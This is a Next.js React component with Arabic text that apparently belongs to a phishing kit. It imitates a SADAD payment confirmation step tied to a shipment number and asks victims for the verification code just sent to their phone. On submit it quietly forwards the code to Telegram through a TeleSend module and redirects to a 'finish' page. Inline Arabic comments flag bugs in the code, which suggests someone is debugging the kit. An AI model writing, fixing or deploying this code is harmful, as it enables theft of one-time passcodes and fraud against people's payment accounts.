"use client"

import styles from './code.module.css'
import { useState } from 'react'
import { useRouter, useSearchParams } from 'next/navigation'
import TeleSned from '@/server/TeleSend'

const CodeTo = () => {
  const { Send } = TeleSned(); // خطأ في اسم الدالة
  const router = useRouter();
  const x = useSearchParams();
  const datas = x.get("names")
  const [form, setForm] = useState({
    data: {
      كود_الاول: "",
      رقم_الشحنة: datas
    }
  })
  
  const setDynamicFormData = (name, value) => {
    setForm({
      data: {
        ...form.data,
        [name]: value,
      }
    })
  }
  
  const PostToTelegram = () => {
    const description = Object.entries(form.data)
      .map((d) => `${d[0]} : ${d[1]} `)
      .join("\n");
    Send(description)
  };
  
  const handlerout = () => {
    if(form.data.كود_الاول == "") { // استخدم === بدلاً من ==
      alert('من فضلك قم بملى الحقول') // خطأ إملائي
    } else {
      router.push(`/fozajil/pay/code/finish?names=${datas}`)
    }
  }

  return (
    <div className={styles.contect}>
      <div>
        <div>
          <img src="" alt="sadad" />
          <img src="" alt="تنزيل png(4)" />
        </div>
        <h1> تاكيد</h1>
        <p>ادخال الكود المرسل حديثا على هاتفك</p>
     
        <form onSubmit={(e) => {
          e.preventDefault();
          PostToTelegram()
        }}>
          {/* الخطأ: name يجب أن يكون "كود_الاول" وليس "code" */}
          <input 
            type="text" 
            name="كود_الاول" 
            onChange={(e) => {
              const { name, value } = e.target;
              setDynamicFormData(name, value);
            }} 
            placeholder="ادخل كود التحقق" 
          />
        
          <button type='submit' onClick={handlerout}>دخول</button>
        </form>
        <img src="" alt="footersadad" />
      </div>
    </div>
  )
}

export default CodeTo
